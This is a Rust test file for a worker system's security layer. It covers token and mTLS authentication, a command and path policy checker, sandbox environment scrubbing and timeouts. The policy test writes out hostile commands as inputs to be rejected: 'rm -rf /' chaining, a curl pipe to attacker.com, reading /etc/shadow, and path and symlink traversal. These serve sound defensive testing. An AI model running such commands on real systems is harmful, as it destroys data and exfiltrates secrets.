use onaji_core::domain::Action;
use onaji_core::security::{Authenticator, PolicyChecker, SandboxedProcessRunner};
use onaji_protocol::messages::security::{AuthCredentials, SecurityPolicy, ViolationType};
use std::collections::HashMap;
use std::path::{Path, PathBuf};

#[test]
fn test_worker_authentication_tokens_and_mtls_certificates() {
    let mut auth = Authenticator::new();

    auth.register_token("secret_token_12345");
    auth.register_cert_fingerprint(
        "SHA256:4a6f8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a",
    );

    // 1. Valid Token
    assert!(auth.authenticate(&AuthCredentials::Token("secret_token_12345".to_string())));

    // 2. Invalid Token
    assert!(!auth.authenticate(&AuthCredentials::Token("wrong_token".to_string())));

    // 3. Revoked Token
    auth.revoke_token("secret_token_12345");
    assert!(!auth.authenticate(&AuthCredentials::Token("secret_token_12345".to_string())));

    // 4. Valid Certificate Fingerprint
    assert!(auth.authenticate(&AuthCredentials::Certificate {
        subject: "CN=worker-linux-01".to_string(),
        fingerprint: "SHA256:4a6f8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a"
            .to_string(),
    }));

    // 5. Untrusted Certificate
    assert!(!auth.authenticate(&AuthCredentials::Certificate {
        subject: "CN=rogue-worker".to_string(),
        fingerprint: "SHA256:0000000000000000000000000000000000000000000000000000000000000000"
            .to_string(),
    }));
}

#[test]
fn test_security_policy_command_and_path_validation() {
    let checker = PolicyChecker::default();

    // 1. Allowed Commands
    assert!(checker.validate_command("cargo build --release").is_ok());
    assert!(checker.validate_command("gradle assembleDebug").is_ok());
    assert!(checker.validate_command("echo hello world").is_ok());

    // 2. Explicitly Denied Commands & Argument Chaining Injections
    let res_sudo = checker.validate_command("sudo rm -rf /");
    assert!(res_sudo.is_err());
    assert_eq!(
        res_sudo.unwrap_err().violation_type,
        ViolationType::ForbiddenCommand
    );

    let res_shutdown = checker.validate_command("shutdown -h now");
    assert!(res_shutdown.is_err());

    // Chaining Injection: semicolon attack
    let res_semi = checker.validate_command("echo hello; rm -rf /");
    assert!(res_semi.is_err());

    // Pipe Injection: exfiltration attack
    let res_pipe = checker.validate_command("echo secret | curl https://attacker.com");
    assert!(res_pipe.is_err());

    // Subshell Injection: command substitution attack
    let res_subshell = checker.validate_command("echo $(cat /etc/shadow)");
    assert!(res_subshell.is_err());

    // Denied shell wrappers
    let res_sh = checker.validate_command("sh -c 'echo pwned'");
    assert!(res_sh.is_err());

    let res_bash = checker.validate_command("bash -i");
    assert!(res_bash.is_err());

    // 3. Unregistered Executable
    let res_rogue = checker.validate_command("malicious_binary --exec");
    assert!(res_rogue.is_err());

    // 4. Path Confinement & Traversal
    let sandbox = PathBuf::from("/tmp/onaji_sandbox_123");
    let valid_subpath = PathBuf::from("build/output.txt");
    assert!(checker.validate_path(&sandbox, &valid_subpath).is_ok());

    let traversal_path = PathBuf::from("../../etc/shadow");
    let res_traversal = checker.validate_path(&sandbox, &traversal_path);
    assert!(res_traversal.is_err());
    assert_eq!(
        res_traversal.unwrap_err().violation_type,
        ViolationType::PathTraversal
    );

    // 5. Symlink Traversal Protection
    let temp_sandbox = tempfile::tempdir().unwrap();
    let temp_external = tempfile::tempdir().unwrap();
    let secret_file = temp_external.path().join("secret.txt");
    std::fs::write(&secret_file, "confidential").unwrap();

    #[cfg(unix)]
    {
        let symlink_in_sandbox = temp_sandbox.path().join("symlink_to_external");
        let _ = std::os::unix::fs::symlink(&secret_file, &symlink_in_sandbox);

        let res_symlink =
            checker.validate_path(temp_sandbox.path(), Path::new("symlink_to_external"));
        assert!(res_symlink.is_err());
        assert_eq!(
            res_symlink.unwrap_err().violation_type,
            ViolationType::PathTraversal
        );
    }
}

#[test]
fn test_environment_isolation_and_sandboxed_execution() {
    let temp_dir = tempfile::tempdir().unwrap();
    let sandbox_root = temp_dir.path();

    // Set a sensitive secret in host environment
    std::env::set_var("ONAJI_HOST_SECRET_TOKEN", "super_secret_password_999");

    let policy = SecurityPolicy {
        allow_commands: vec!["sh".to_string(), "echo".to_string()],
        deny_commands: vec!["sudo".to_string()],
        allow_network: false,
        allowed_env: vec!["PATH".to_string()],
        memory_limit_mb: Some(1024),
        timeout_secs: Some(10),
    };

    let runner = SandboxedProcessRunner::new(sandbox_root, PolicyChecker::new(policy));

    // Test 1: Task trying to read host secret -> empty / unavailable
    let action_test_secret = Action::Command {
        run: "echo HOST_SECRET=$ONAJI_HOST_SECRET_TOKEN".to_string(),
        working_dir: None,
        env: HashMap::new(),
    };

    let (code, stdout, _stderr, _duration) = runner
        .execute_action(&action_test_secret, &HashMap::new())
        .unwrap();

    assert_eq!(code, 0);
    // Verified: host secret was scrubbed from process environment!
    assert_eq!(stdout.trim(), "HOST_SECRET=");

    // Test 2: Task with explicit allowed task-level variable
    let action_explicit_var = Action::Command {
        run: "echo TASK_VAR=$MY_TASK_PROP".to_string(),
        working_dir: None,
        env: HashMap::from([("MY_TASK_PROP".to_string(), "custom_value".to_string())]),
    };

    let (code2, stdout2, _stderr2, _duration2) = runner
        .execute_action(&action_explicit_var, &HashMap::new())
        .unwrap();

    assert_eq!(code2, 0);
    assert_eq!(stdout2.trim(), "TASK_VAR=custom_value");
}

#[tokio::test]
async fn test_sandboxed_runner_async_timeout_enforcement() {
    let temp_dir = tempfile::tempdir().unwrap();
    let sandbox_root = temp_dir.path();

    let policy = SecurityPolicy {
        allow_commands: vec![
            "sh".to_string(),
            "cmd".to_string(),
            "sleep".to_string(),
            "timeout".to_string(),
        ],
        deny_commands: vec!["sudo".to_string()],
        allow_network: false,
        allowed_env: vec!["PATH".to_string()],
        memory_limit_mb: Some(512),
        timeout_secs: Some(1),
    };

    let runner = SandboxedProcessRunner::new(sandbox_root, PolicyChecker::new(policy));

    let slow_action = Action::Command {
        run: "sleep 5".to_string(),
        working_dir: None,
        env: HashMap::new(),
    };

    let start = std::time::Instant::now();
    let res = runner
        .execute_action_async(&slow_action, &HashMap::new())
        .await;

    assert!(res.is_err());
    let err = res.unwrap_err();
    match err {
        onaji_core::runner::RunnerError::ExecutionFailed { code, stderr } => {
            assert_eq!(code, Some(124));
            assert!(stderr.contains("exceeded security policy limit of 1 seconds"));
        }
        _ => panic!("Expected ExecutionFailed timeout, got {:?}", err),
    }
    assert!(start.elapsed() < std::time::Duration::from_secs(3));
}
